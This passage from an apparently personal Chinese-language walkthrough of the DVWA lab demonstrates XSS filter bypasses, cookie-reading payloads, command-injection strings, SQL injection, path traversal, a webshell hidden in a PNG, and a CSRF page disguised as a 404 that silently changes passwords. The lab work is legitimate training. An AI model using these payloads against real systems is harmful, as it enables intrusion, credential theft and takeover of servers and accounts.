说明我们的注入成功，这种最低级的注入能够注入成功证明网页没有任何的安全措施。所以该网页存在存储型的XSS漏洞。因此可以利用该漏洞实现其他的操作。

注意：name中尝试注入的时候存在字符限制，只能输入十个字符。

![image-20230519134924980](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519134924980.png)

---

### XSS-Stored Middle

我们拿到一个网页可以看他的前端代码，在前端的代码里找脆弱性，通过抓包来获取数据包的数据，对数据包实现注入，这都是我们的手段，所以即使在没有后端代码的情况下还是能使用其他的手段进行注入。

![image-20230519140056340](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519140056340.png)

可以看见不论是name还是message都对输入的内容长度进行了限制，这次推荐使用抓包的方式来进行

![image-20230519143429833](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519143429833.png)

这两个参数就是网页的输入，尝试使用刚才的方式进行注入；

![image-20230519145146099](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519145146099.png)

注入失败，说明网站做了相应的安全措施，需要使用一些WAF绕过手段，常见的手段有大小写绕过、编码绕过、重写绕过以及HTTP头部绕过；

这里尝试使用大小写的方式进行绕过：

![image-20230519155205422](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519155205422.png)

放行后，结果如下：

![image-20230519155231609](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519155231609.png)

没有弹出会话框，说明message中大小写注入是有防范措施的，但是name也是一个注入框，可以尝试对name尝试注入；

![image-20230519155439368](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519155439368.png)

放行后的结果：

![image-20230519155821258](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519155821258.png)

说明网页存在xss存储型的注入点，但是注入点在name输入框内；

以上绕过方式只是使用了一种，当然还是可以使用其他的绕过方式，这里不做过多举例，可以尝试自己练习摸索，找出更多的waf绕过漏洞；

所以本网站存在xss存储型漏洞；

---

### XSS-Stored High

尝试使用多种方式进行绕过，例如：大小写绕过、编码绕过、重写绕过以及HTTP头部绕过

**大小写绕过**

message框：

![image-20230519194434952](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519194434952.png)

![image-20230519194615791](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519194615791.png)

name框：

![image-20230519194722627](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519194722627.png)

![image-20230519194738044](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519194738044.png)

尝试使用其他的绕过，重写绕过：

![image-20230519195353629](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519195353629.png)

同时对两个框进行注入，结果如下：

![image-20230519195426678](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519195426678.png)

注入失败；

尝试对UA进行注入：

![image-20230519195622959](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519195622959.png)

结果如下：

![image-20230519195704465](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519195704465.png)

没反应，鼓起其他的文件头注入也越高失效了，极有可能是双标签被屏蔽了，尝试使用单标签注入；

使用img或者a等标签进行注入。

![image-20230519200835605](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519200835605.png)

结果如下：

![image-20230519200956163](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519200956163.png)

尝试对name进行单标签的注入；

![image-20230519201127735](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519201127735.png)

结果：

![image-20230519201841307](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519201841307.png)

![image-20230519201903988](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519201903988.png)

所以该网站存在XSS存储型漏洞，name输入框存在注入点，单标签注入。

## XSS DOM型注入通关

### XSS(DOM) Low

![image-20230511144033998](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511144033998.png)

进入页面那可以看见，这没有输入框，没有输入框就只有通过抓取数据包，对数据包进行注入或者在URL地址栏进行注入；

> **举一反三**
>
> 看见存在输入框的，就一定要来测试这个页面有没有存在注入型的漏洞，养成习惯，见框就插，例如SQL注入、XSS注入、Commend注入等注入攻击，如果页面没有输入框一定要记得URL地址栏，这是上天赐予你的永久使用的注入点，如果URL注入失败，就去尝试抓包，把页面的http数据包抓取下来进行http文件注入攻击。

> **在实际情况中页面不会像靶场一样给你现实这些内容，那么如何进行判断呢？**
>
> 打开开发者模式查看前端代码，注入之后再查看页面的源代码，看看有什么区别，如果有变化，说明存在注入点，没有变化说明可能没有注入点。

**alert() **方法，用于显示带有一条指定消息和一个 OK 按钮的警告框。**document.cookie** 里面可以读到 cookie 信息，我们可以把 cookie 放在一个 alert() 生成的警告框中，回显时就会得到我们想要的信息了。

尝试在URL地址栏及逆行注入以下内容：

```
http://192.168.8.107/dvwa/DVWA-master/vulnerabilities/xss_d/?default=<script>alert("Hello World")</script>
```

查看执行结果：

![image-20230511144432662](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511144432662.png)

可以看见弹出了提示框，说明我们的注入是可行的

![image-20230511144515325](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511144515325.png)

同时页面也发生了变化，

---

### XSS(DOM) Middle

![image-20230511145145939](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511145145939.png)

进入靶场后可以发现没有任何的变化，还是存在一个选择项目和列表选择框；

尝试再URL地址栏中进行注入；

```
http://192.168.8.107/dvwa/DVWA-master/vulnerabilities/xss_d/?default=<script>alert("Hello World")</script>
```

![image-20230511145802048](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511145802048.png)

尝试使用一些绕过方法来注入

**重写绕过**

```
http://192.168.8.107/dvwa/DVWA-master/vulnerabilities/xss_d/?default=<scscriptript>alert("Hello World")</scscriptript>
```

![image-20230511150007612](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511150007612.png)

结果是没有弹出提示框，而是再选择框内出现代码，很明显重写失败了

**大小写绕过**

```
http://192.168.8.107/dvwa/DVWA-master/vulnerabilities/xss_d/?default=<SRCIPT>alert("Hello World")</script>
```

![image-20230511150222356](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511150222356.png)

失败！

**编码绕过**

```
http://192.168.8.107/dvwa/DVWA-master/vulnerabilities/xss_d/?default=<img src="x" onerror="alert%28%22Hello%20World%22%29" >
```

![image-20230511150401390](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511150401390.png)

很明显这样也不行，最后只有只用终极杀手锏，Cookie攻击

**Cookie绕过**

在HTML中由个特殊的元素，<option>和<select>，<option>用于定义在<select>或<datalist>元素的包含项，其主要功能就是在**弹出窗口**和HTML文档中的**其他项目列表中表示菜单**；所有这里需要借助这两个标签；

```
http://192.168.8.107/dvwa/DVWA-master/vulnerabilities/xss_d/?default=English<option><select></select></option><img src="x" onerror="alert(document.cookie)" >
```

![image-20230511152330718](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511152330718.png)

可以看见通过Cookie进行注入成功实现，返回了当前网页的sessionID，说明当前网页存在Cookie注入的漏洞

---

### XSS(DOM) High

尝试使用Cookie来进行注入

```
http://192.168.8.107/dvwa/DVWA-master/vulnerabilities/xss_d/?default=English<option><select></select></option><img src="x" onerror="alert(document.cookie)" >
```

![image-20230511152824724](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511152824724.png)

没有效果，说明这次可能过滤了URL输入框内的所有内容，尝试使用BP进行注入；为了进一步验证事都对输入框进行了过滤；

在HTML中，井号“#”通常用于创建内部链接锚点。通过在链接地址中添加井号后跟锚点名，可以使页面跳转到指定的锚点位置。例如：<a href="#section1">跳转到第一节</a>。

在JavaScript中，井号“#”通常用于选择页面中的元素。通过使用CSS选择器语法和井号来选择页面中对应id的元素。例如：document.querySelector("#example")。所以注释符 “#”，注释后边的内容不会发送到服务端，但是会被前端代码所执行。

所以#在前端始终会被执行，出给过滤了#；

```
http://192.168.8.107/dvwa/DVWA-master/vulnerabilities/xss_d/?default=English #<script>alert(document.cookie)</script>
```

![image-20230511153919329](D:\Document\My_book\My_Books\钟全龙著\img\image-20230511153919329.png)

这里注入成功，说明该网页存在XSS漏洞。

---

## 命令注入通关

### Commend Injection Low

命令注入是一种远程命令执行漏洞，通过特殊符号来与系统命令进行拼接，实现shell命令的执行，来获取更多信息，执行恶意代码等操作。

首先修改字符，原因是默认的字符集和数据库的字符集不匹配。

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230420152331853.png" alt="image-20230420152331853"  />

修改文件，路径为dvwa/dvwa/includs/dvwapage.inc：

<img src="D:\Document\My_book\My_Books\钟全龙著\img\image-20230420153003166.png" alt="image-20230420153003166"  />

记得替换所有。

尝试注入代码：

```
# 查看当前目录
192.168.8.103&&dir
```

这里为什么要注入IP，注入其他的不行吗？因为这里让你输入IP(Enter an IP address)，正确情况下肯定不是这样的。

![image-20230420153516090](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420153516090.png)

注入代码：

```
# 查看当前网络状态
192.168.8.103&&netstat
```

![image-20230420153654340](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420153654340.png)

```
# 检查目标机器是否能正确通信
192.168.8.103&&ipconfig
```

![image-20230420153802674](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420153802674.png)

```
# 查看目标几的用户ID
192.168.8.103&&whoami
```

![image-20230420154055839](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420154055839.png)

此时可以看见用户的名字被返回了回来，用户就是administer。

```
# 查看系统的信息，通过目标主机来利用未被修复的漏洞，因为返回的信息包含着用户打补丁的信息
192.168.8.103&&systeminfo
```

![image-20230420154453461](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420154453461.png)

拿到以上信息就可以对目标主机发起攻击。

---

### Commend Injection Middle

级别的提升肯定会意味着注入的方式会被屏蔽，所以先尝试没有安全措施的注入，注入一定是从简到难。

![image-20230420154742526](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420154742526.png)

```
# 尝试输入以下信息
192.168.8.106&&dir
```

![image-20230420155000711](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420155000711.png)

可以尝试换其他的符号，

```
# 尝试输入一下信息
192.168.8.103&dir
```

![image-20230420155613300](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420155613300.png)

```
192.168.8.103&;&dir
```

![image-20230420155726838](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420155726838.png)

发现使用&;&也能实现注入，看来这里只对&&和;进行了过滤。

当我们输入&;&的是时候，过滤的是&&和;，所以这里只把中间的;过滤了，前后的&还可以进行拼接，所以能达到注入的效果。

```
192.168.8.103&&&dir
```

![image-20230420160159108](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420160159108.png)

---

### Commend Injection High

```
# 尝试多个&来进行注入
192.168.8.103&&&dir
```

![image-20230420161105892](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420161105892.png)

这里注入失败了，说明单个&也被过滤了。

```
# 尝试使用$ 进行注入
192.168.8.103$$$dir
```

![image-20230420161304740](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420161304740.png)

注入以失败告终，说明$也被禁用了  

尝试使用其他的符号。

```
() ^ % # @ - + |
```

```
192.168.8.103|||dir
```

![image-20230420162308973](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420162308973.png)

尝试查看开启的端口和网络服务

![image-20230420162447886](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420162447886.png)

尝试查看用户

![image-20230420162657750](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420162657750.png)

尝试寻找目标主机的漏洞，没有打补丁，就有漏洞可循

![image-20230420162757195](D:\Document\My_book\My_Books\钟全龙著\img\image-20230420162757195.png)

## 爆破通关

### Brute Force Low

#### 拦截网页请求

> ##### 思路
>
> 看见这种由输入框的就一定要想到sql注入和弱密码爆破等这些注入手段，如果爆破不成功，就尝试sql注入，如果GET型sql注入不成功，就使用POST型进行注入。这是最基本的思路。

首先打开浏览器的代理，将代理切换成Burp，然后打开BurpSuite进行拦截，得到如下：

![image-20230427092634319](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427092634319.png)

然后将该报文信息发送到Intruder：

![image-20230427092754169](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427092754169.png)

然后点击Intruder：

![image-20230427092826860](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427092826860.png)

选中绿色的部分，清除

![image-20230427095810470](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427095810470.png)

#### 字典攻击

进入payload界面：

![image-20230427100231694](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427100231694.png)

然后选择充文件加载，加载之后就是如下内容：

![image-20230427100447373](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427100447373.png)

然后点击开始攻击即可：

![image-20230427100618386](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427100618386.png)

我们只需要关注这几个地方：

![image-20230427100720576](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427100720576.png)

然后取消勾选2xx以外的选项，对成功写入文本框并且放回数据的内容进行过滤：

![image-20230427100807645](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427100807645.png)

然后浏览攻击结果，长度是关键，可以看见很多长度都是4487，多名很多字典都是错误的，不是正确的密码；

![image-20230427101509022](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427101509022.png)

可以看见这里有个4525，说明这极有可能是密码，尝试使用它登录；

![image-20230427101649177](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427101649177.png)

最后查看查看网页进行验证；

![image-20230427101739354](D:\Document\My_book\My_Books\钟全龙著\img\image-20230427101739354.png)

结果正确，说明admin的密码就是password。

#### sql爆破

还可以尝试SQL注入进行破解；

在username的输入框中输入以下payload：

```sql
admin' or '1'='1
```

![image-20230531092145933](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531092145933.png)

一般情况下一些通都是带有默认账户admin或者root等超级用户，一开始为了方便记住是没有人去修改原来的弱密码的，所以可以试用弱密码爆破和sql注入的方式来破解。

---

### Brute Force Middle

#### 字典爆破

进入的界面还是和原来一样，一个账户和密码的输入框，我们还是用BurpSuite进行抓包，然后进行爆破；

![image-20230531093316544](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531093316544.png)

进入到intruder后选择payload注入点，由于只对username和password进行爆破，所以其他的payload可以直接删除

![image-20230531094408624](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531094408624.png)

选择kali自带的字典库来进行攻击爆破，也可以自己去写字典或者网上下载，自己如何去写字典，根据用户的信息：手机号，身份证，QQ等信息进行猜测，使用人们常用的关键字密码行为进行猜测，例如名字简写+手机号或者QQ号、生日等；

```shell
# 文件目录
/usr/share/wordlist/login
```

![image-20230531094824993](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531094824993.png)

最后点击右上角的start Attack进行攻击；

![image-20230531150243351](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531150243351.png)

成功的爆破到密码，接下来尝试使用sql注入来获取密码，该网页与上面不同的是普通的sql注入是不行耳朵，需要一些绕过手段，这里就不演示了，可以自己下去尝试；

-----

### Brute Force High

待更新...



## 文件包含漏洞通关

### 简介

File Inclusion ，意思是文件包含（ 漏 洞 ）， 是指当服务器开启allow_url_include 选项时，就可以通过 php 的某些特性函数（include()，require()和 include_once()，require_once()）利用 url 去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了 php 配置中的 allow_url_fopen 选项（选项开启之后，服务器允许包含一个远程的文件）

----

### File Inclusion Low

![image-20230601001322837](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601001322837.png)

随便点击一个；

![image-20230601001427383](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601001427383.png)

现实中，恶意的攻击者是不会乖乖点击这些链接的，因此 page 参数是不可控的。

#### 漏洞利用

尝试构造URL，将参数改为/etc/passwd/或者/etc/shadow

![image-20230601001601070](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601001601070.png)

![image-20230601001757562](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601001757562.png)

报错，显示没有这个文件，说明不是服务器系统不是 Linux，但同时暴露了服务器文件的绝对路径  C:\Users\33130

继续构造URL(绝对路径)

![image-20230601002106798](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601002106798.png)

此时页面发生了变化，成功的读取了php.ini文件

继续构造URL

```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\Users\33130\phpstudy_pro\WWW\dvwa\php.ini
```

加这么多..\是为了保证到达服务器的 C 盘根目录，可以看到读取是成功的；配置文件中的 Magic_quote_gpc 选项为 off。在 php 版本小于 5.3.4 的服务器中，当 Magic_quote_gpc 选项为 off 时，我们可以在文件名中使用%00 进行截断，也就是说文件名中%00 后的内容不会被识别；

注意：使用%00截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php，这时链接 A 会读取失败，而链接 B 可以绕过规则成功读取。

---

#### 远程文件包含

利用文件上传漏洞来破解也是ke以的

---

### File Inclusion Middle

尝试用刚才的方式进行攻击，看是否有效，尝试修改page的数值；

![image-20230601081556103](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601081556103.png)

不管用了，有可能是把\改成了/，尝试修改成/；

![image-20230601081906454](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601081906454.png)

还是没有用；

刚才我们是才拿到了绝对路径的，这里很有可能屏蔽了..\或者../之类的，但是绝对路径还是暴露了，使用绝对路径即可；

![image-20230601082128052](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601082128052.png)

可以看见我们的危险函数是打开的，刚才我们只尝试了../和..\，没有对./和.\进行尝试；我们来尝试下，方便更好的实现目录遍历

![image-20230601082443605](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601082443605.png)

说明..\和.\\都被屏蔽了；

![image-20230601082858303](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601082858303.png)

这里我们只有使用绝对路径来进行注入，目录遍历漏洞不存在；

----

### File Inclusion High

尝试使用本地路径，用原来的方法试探；

![image-20230601083857784](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601083857784.png)

这种方法已经完全失效了；

我们使用绕过手段，利用file协议绕过防护策略；

![image-20230601084116703](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601084116703.png)

结果成功返回绝对路径；

这里直接使用绝对路径获取php.ini;

![image-20230601084342912](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601084342912.png)

![image-20230601084526938](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601084526938.png)

不行，绝对路径失败；

使用file协议进行绕过；

![image-20230601084604374](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601084604374.png)

返回结果，网站存在文件包含漏洞和

## 文件上传漏洞通关

### 简介

文件上传漏洞的产生就是没有很好的过滤文件后缀，使得攻击者可以通过上传木马获取服务器的 webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞

---

### File upload Low

文件上传就是没有对文件的后缀没有好好的过滤；

![image-20230531103304678](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531103304678.png)

![image-20230531102934570](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531102934570.png)

把第一行的数据删除，只需要phpinfo()的一行，然后使用蚁剑连接；

![image-20230531104246323](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531104246323.png)

> **注意，post请求的操作要和连接密码一样**

添加进来之后就是这样的

![image-20230531104341970](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531104341970.png)

然后双击网址进入以下界面；

![image-20230531104446689](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531104446689.png)

然后打开终端：

![image-20230531104553305](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531104553305.png)

进入后就是这样的；

![image-20230531104655960](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531104655960.png)

此时就可以通过这个肉鸡进行操作了

![image-20230531104831420](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531104831420.png)

-----

### File upload Middle

将等级切换后，网站就对一些文件进行了过滤

![image-20230531105032678](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531105032678.png)

他说只能上传jpeg和png图片格式，但是我上传的确实是png图片呀，难道有什么问题？尝试换几张图片；

![image-20230531105253679](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531105253679.png)

当我换了一张python的图标图片的时候，就上传成功了，这是什么原因呢？尝试查看两张图片的属性进行对比有什么不同；

![image-20230531105417170](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531105417170.png)

除了大小和时间、图片内容不同外，没有其他的不同了，那很明显网站对文件上传的大小进行了限制，大小是多小呢？再用几张图片进行测试揣摩就可以了；

屡试几次，发现超过100KB的图片是无法上传的，只有100KB以内的能够上传，当然这是推测，具体是多少我们是不知道的；

这里对文件进行了限制，那我们也需要修改文件格式来绕过他的过滤；

![image-20230531110648110](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531110648110.png)

然后将文件上传后，然后用蚁剑连接，结果很遗憾，没有连接上；

![image-20230531111535210](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531111535210.png)

蚁剑的原理是向上传文件发送包含`?`参数的 post 请求，通过控制`?`参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送 post 请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。

那么如何让服务器将其解析为 php 文件呢？可以抓包修改文件后缀来解析php文件；

在kaliLinux上编写小马；然后上传；

![image-20230531153251754](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531153251754.png)

> **有人会提问了，难道这里修改不会被屏蔽吗？**
>
> 有一些上传接口在对文件进行类型验证时，仅基于文件后缀名进行判断，而没有检查文件内容或者魔术数字等信息。攻击者便可以通过在Burp Suite等抓包工具中抓取上传请求，然后修改请求中的文件后缀名、文件类型等相关信息，伪装成合法的上传请求发往服务器。
>
> 因此，如果服务器端仅仅依赖于文件后缀名来验证上传的文件类型，那么攻击者可以通过修改文件后缀名，从而绕过验证，上传不正确的文件类型。这种漏洞通常被称为“后缀名绕过”漏洞。

最后上传成功

![image-20230531153528456](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531153528456.png)

然后上蚁剑连接；

![image-20230531154403733](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531154403733.png)

最后成功连接，尝试使用命令检测；

![image-20230531154534022](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531154534022.png)

-----

### File upload High

尝试上一关卡的手法，抓包修改，上传；

![image-20230531155049025](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531155049025.png)

![image-20230531155130268](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531155130268.png)

结果如下：

![image-20230531155243804](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531155243804.png)

这里无法使用后缀名绕过的手法；

这里推荐一种新的手法，文件合并，这是CFT的常见的一种扯皮操作，将php文件和jpg文件合并；打开终端使用以下命令进行合并；

```
C:\Users\33130\Desktop>copy python.png /b + php.php /a hack.png
```

这里我将php.php和python.png

![image-20230531160011051](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531160011051.png)

![image-20230531165523749](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531165523749.png)

![image-20230531165746886](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531165746886.png)

顺序不能错，后面的文件隐藏在前面的文件中，一旦反了那就不是png图片了，此时我们将木马隐藏在了图片中，然后将文件上传；

![image-20230531165829818](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531165829818.png)

最后成功上传，使用蚁剑连接；

![image-20230531171447696](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531171447696.png)

## CSRF通关

### CSRF Low

#### 简介

CSRF，全称 Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF 与 XSS 最大的区别就在于，CSRF 并没有盗取 cookie 而是直接利用。在 2013 年发布的新版 OWASP Top 10 中，CSRF 排名第 8。

----

![image-20230531204258266](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531204258266.png)

需要注意的是，CSRF 最关键的是利用受害者的 cookie 向服务器发送伪造请求，所以如果受害者之前用 Chrome 浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用 Chrome 浏览器的cookie，所以会自动跳转到登录界面。

总有人会嘴硬，这太明显了，不会有人点的，还真有好奇的人点，然后才会铁索连环，相信你肯定中招过，虚假的QQ会员我不行大家没点过，那个时候为了装杯肯定会有人点击。

---

前面说了大致的思路现在开始正式攻击，这里我们构造一个虚假的报错页面，让人误以为自己的密码错误了，实际上没有错，达到一个欺骗的效果；

现场时修改密码在网页，此时网页出现了以下内容；

![image-20230531212636415](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531212636415.png)

只要诱骗用户点击这个恶意链接，就会将在不知情的情况下将密码改为123456

首先使用BurpSuite对目标网站进行抓包；

![image-20230531213353188](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531213353188.png)

然后点击行动-相关工具-CSRF PoC生成

![image-20230531213716446](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531213716446.png)

复制链接：

![image-20230531213945727](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531213945727.png)

```
http://burpsuite/show/1/z08pgf9h54x633koka0qfna77mrmtxxt
```

访问

![image-20230531220417053](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531220417053.png)放行

![image-20230531220533293](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531220533293.png)

尝试登录

```
user:admin
password:123456
```

结果登录成功

![image-20230531214720227](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531214720227.png)

因为cookie没有过期，当到了恶意网站的时候就会吧信息盗走，此时我们利用别人的账号密码实现了登录。当然你也可以在URL地址栏进行修改来篡改密码；

#### 利用攻击

构造链接

```
http://127.0.0.1/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#
```

缩短地址，为什么要缩短链接，因为原来的地址太明显了，此处我们通过短链接来隐藏真实的网站；

![image-20230531220133051](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531220133051.png)

构造攻击页面，在 C:\phpstudy_pro\WWW 文件夹中建立一个 1.html ，里面写入,实际情况要通过木马来拿到目标用户权限来创建文件

```html
<img src="http://127.0.0.1/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#" border="0" style="display:none;"/>
<h1>404<h1>
<h2>file not found.<h2>
```

![image-20230531220045034](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531220045034.png)

![image-20230531215424582](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531215424582.png)

----

### CSRF Middle

首先修改密码；

![image-20230531233050840](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531233050840.png)

然后讲这个URL复制到一个新的界面，看是否能够进去；

![image-20230531233138403](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531233138403.png)

结果是错误的，为什么不行呢？我们抓取数据包来做对比；

![image-20230531233326882](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531233326882.png)

抓取复制后链接的数据包；

![image-20230531233504014](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531233504014.png)

讲两个数据包做对比发现确实不太一样，第二个数据包找了referer字段的内容；

![image-20230531233819413](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531233819413.png)

```
Referer: http://192.168.8.113/dvwa/vulnerabilities/csrf/
```

也就是说只有拥有中国referer字段的时候才能修改成功密码；

我们尝试在bp里面开能否修改成功，把密码修改为1234；

![image-20230531234142149](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531234142149.png)

这里显示修改成功；

![image-20230531234223842](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531234223842.png)

那我尝试在爆破靶场里登录一下看能否修改成功；

![image-20230531234345035](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531234345035.png)

登录成功，说明该网页对referer字段进行了过滤，我们只有在第一次抓包的时候拿到数据包做修改才能攻破；

----

### CSRF High

还是用刚才的方法才测试网站；

![image-20230531234719197](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531234719197.png)

将链接用一个新的窗口打开；

![image-20230531234843931](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531234843931.png)

任然不行和刚才一样；

并且URL地址里的链接也发生了变化；

![image-20230531235000010](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531235000010.png)

![image-20230531235041887](D:\Document\My_book\My_Books\钟全龙著\img\image-20230531235041887.png)

下面这张图片是中级靶场的网页，上面的是高级靶场的网页，区别就是多了一个token机制，说明该网页是做过token安全防护的；用户每次访问改密页面时，服务器会返回一个随机的 token，向服务器发起请求时，需要提交token 参数，而服务器在收到请求时，会优先检查 token，只有 token 正确，才会处理客户端的请求。

#### token绕过

要绕过 High 级别的反 CSRF 机制，关键是要获取 token，要利用受害者的cookie 去修改密码的页面获取关键的 token。

**攻击思路**

是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的 token，并向服务器发送改密请求，以完成 CSRF攻击，但是这里必须跨域才实现这种操作，那我们该怎么办呢？

由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器192.168.8.113 中，才有可能完成攻击。下面利用 High 级别的 XSS 漏洞协助获取 Anti-CSRF token（因为这里的 XSS 注入有长度限制，不能够注入完整的攻击脚本，所以只获取 Anti-CSRF token）

我们在刚才的URL地址的里面看到了Token，是否是真的token呢？可以通过抓包获取，或者XSS弹窗获取；

我们先尝试XSS弹窗获取；

```javascript
<iframe src="../csrf" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)> 
```

![image-20230601000324925](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601000324925.png)

很明显和刚才的不一样，抓包试一下；
